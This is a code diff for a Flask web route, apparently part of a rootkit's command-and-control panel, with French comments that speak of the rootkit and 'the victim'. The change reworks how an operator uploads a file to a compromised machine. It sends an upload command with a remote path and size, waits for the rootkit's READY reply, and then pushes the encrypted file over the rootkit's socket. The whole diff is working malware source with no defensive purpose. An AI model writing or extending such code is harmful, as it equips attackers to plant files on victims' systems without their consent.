@@ -8,28 +8,53 @@ from utils.server import TCPServer
 @app.route('/upload', methods=['GET', 'POST'])
 def upload():
     if request.method == 'POST':
-        uploaded_file = request.files.get('file')
+        if 'file' not in request.files:
+            flash('Aucun fichier sélectionné.', 'error')
+            return redirect(request.url)
 
-        if uploaded_file:
-            filename = secure_filename(uploaded_file.filename)
-            local_path = os.path.join(cfg.UPLOAD_FOLDER, filename)
-            uploaded_file.save(local_path)
+        file = request.files['file']
+        remote_path = request.form.get('remote_path')
 
-            try:
-                with open(local_path, "rb") as f:
-                    data = f.read()
+        if file.filename == '':
+            flash('Nom de fichier vide.', 'error')
+            return redirect(request.url)
 
-                # Envoie la commande "upload" avec nom de fichier distant
-                cfg.rootkit_connexion.send_to_client(f"upload {filename}")
+        if not remote_path:
+            flash('Chemin distant requis.', 'error')
+            return redirect(request.url)
 
-                # Envoie du fichier complet (automatiquement chiffré + chunké)
-                cfg.rootkit_connexion.send_to_client(data)
+        filename = secure_filename(file.filename)
+        file_data = file.read()
 
-                # Envoie marqueur de fin
-                cfg.rootkit_connexion.send_to_client("EOF")
+        try:
+            # 1. Envoie la commande au rootkit
+            size = len(file_data)
+            command = f"upload {remote_path} {size}"
+            response = cfg.rootkit_connexion.send_to_client(command)
 
-                flash(f"✅ Fichier '{filename}' envoyé avec succès à la victime.")
-            except Exception as e:
-                flash(f"❌ Échec lors de l'envoi du fichier : {e}")
+            if response is None:
+                flash("Aucune réponse du rootkit.", "error")
+                return redirect(request.url)
 
-    return render_template("upload.html")
+            if response.strip().upper() != "READY":
+                flash(f"Refus du rootkit : {response.strip()}", "error")
+                return redirect(request.url)
+
+            flash(f"✅ Rootkit prêt pour l'upload vers {remote_path}", "success")
+
+            # 2. Envoi binaire chiffré du fichier
+            success = cfg.rootkit_connexion._network_handler.send(
+                cfg.rootkit_connexion._client_socket,
+                file_data
+            )
+
+            if not success:
+                flash("❌ Échec de l’envoi du fichier.", 'error')
+            else:
+                flash("📤 Fichier envoyé avec succès !", 'success')
+
+        except Exception as e:
+            flash(f"Erreur lors de l’envoi : {e}", 'error')
+            return redirect(request.url)
+
+    return render_template('upload.html')
